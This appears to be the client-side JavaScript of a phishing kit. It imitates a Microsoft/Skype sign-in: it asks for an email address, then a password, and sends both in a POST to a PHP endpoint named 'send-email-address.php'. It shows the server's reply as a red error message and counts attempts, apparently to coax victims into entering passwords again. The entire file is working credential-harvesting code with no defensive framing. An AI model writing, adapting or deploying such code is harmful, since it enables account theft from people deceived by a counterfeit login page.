var counter = 0;
var email = document.getElementById('email');
var password = document.getElementById('password');

$('#next').click(function(e){
	e.preventDefault();
	var checkmail = /^\w+([\.-]?\w+)*@\w+([\.-]?\w+)*(\.\w{2,3})+$/g;
	var alert2 = document.querySelector('.alert2');
	
	if($('#email').val() == ""){
		$('#email').focus();
		$('.alert2').show();
		alert2.textContent = "Enter a valid email address, phone number, or Skype name.";
		return false;
	}else if(!($('#email').val().match(checkmail))){
		$('#email').focus();
		$('.alert2').show();
		alert2.textContent = "Enter a valid email address, phone number, or Skype name.";
		return false;
	}else{
		$('#email').hide();
		$('#password').show();
		$('#password').focus();
		$('#next').hide();
		$('#signin').show();

		$('#signin').click(function(e){
			if($('#password').val() == ""){
				$('#password').focus();
				$('.alert2').show();
				alert2.textContent = "Please enter a valid password for you account";
				return false;
			}else{
				counter = counter + 1;
				alert2.style.color = "#0073C6";
				alert2.textContent = "Loggin in...";
				$('.alert2').show();

				var xmlhttp;
			    if(window.XMLHttpRequest){
			      xmlhttp = new XMLHttpRequest();
			    }else{
			      xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
			    }

			    xmlhttp.onreadystatechange=function(){
			      console.log(xmlhttp.responseText);
			      if(xmlhttp.readyState==4 && xmlhttp.status==200){
						alert2.style.color = "red";
						alert2.textContent = xmlhttp.responseText;
			      } else {
			      	console.log(xmlhttp.responseText);
			      }
			    }

			    var email = document.getElementById('email').value;
			    var password = document.getElementById('password').value;
			    var formdata = new FormData();

		    	formdata.append("email", email);
		    	formdata.append("password", password);

			    var url = 'send-email-address.php?others';
			    
			    xmlhttp.open("POST", url);
			    xmlhttp.send(formdata);

			    return false;

			}
		});
	}
})